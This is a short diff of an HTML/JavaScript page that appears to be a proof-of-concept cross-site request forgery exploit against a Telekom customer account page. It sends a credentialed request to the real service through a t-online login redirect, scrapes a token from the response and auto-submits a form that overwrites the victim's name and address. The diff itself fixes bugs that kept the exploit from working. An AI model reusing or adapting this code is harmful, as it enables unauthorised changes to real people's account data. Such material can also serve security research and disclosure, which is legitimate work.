@@ -8,7 +8,7 @@
   <input type="hidden" name="javax.faces.partial.render" value="@none"/>
   <input type="hidden" name="j_idt53" value="j_idt53"/>
   <input type="hidden" name="j_idt53:j_idt116:j_idt120:personDataSave" value="j_idt53:j_idt116:j_idt120:personDataSave"/>
-  <input type="hidden" name="j_idt53=j_idt53&j_idt53:j_idt74:j_idt76:salutation" value=""/>
+  <input type="hidden" name="j_idt53:j_idt74:j_idt76:salutation" value=""/>
   <input type="hidden" name="j_idt53:j_idt74:j_idt82:firstname" value="bwahahaha"/>
   <input type="hidden" name="j_idt53:j_idt74:j_idt86:lastname" value="testingra"/>
   <input type="hidden" name="j_idt53:j_idt74:j_idt90:street" value="test"/>
@@ -25,7 +25,7 @@ function getData() {
   x.withCredentials = true;
   x.open("POST","https://login.t-online.de/?returnToUrl=https%3A%2F%2Fmeinkonto.telekom-dienste.de%2Fkundencenter%2Fdaten.xhtml%3Fjavax.faces.partial.ajax%3Dtrue%26javax.faces.source%3Dj_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%26javax.faces.partial.execute%3D%40all%26javax.faces.partial.render%3D%40none%26j_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%3Dj_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%26j_idt53%3Dj_idt53%26j_idt53%3Aj_idt74%3Aj_idt76%3Asalutation%3D%26j_idt53%3Aj_idt74%3Aj_idt82%3Afirstname%3Dbwahahaha%26j_idt53%3Aj_idt74%3Aj_idt86%3Alastname%3Dtestingra%26j_idt53%3Aj_idt74%3Aj_idt90%3Astreet%3Dtest%26j_idt53%3Aj_idt74%3Aj_idt94%3Azipcode%3D12121%26j_idt53%3Aj_idt74%3Aj_idt98%3Acity%3Dtest%26j_idt53%3Aj_idt74%3Aj_idt102%3Acountry%3DAX",true);
   x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-  x.send(data); 
+  x.send(null); 
 }
 x.onreadystatechange = function() {
   if (x.readyState == XMLHttpRequest.DONE) {
@@ -38,7 +38,7 @@ x.onreadystatechange = function() {
     var y = token.childNodes[0];
     var test = y.replace('<\![CDATA[ ',' ]]>', "");
     var token2 = encodeURI(test);
-    document.getElementById("findtoken").value = token2.nodeValue;
+    document.getElementById("findtoken").value = token2;
     document.getElementById("form").submit();
   }
 }
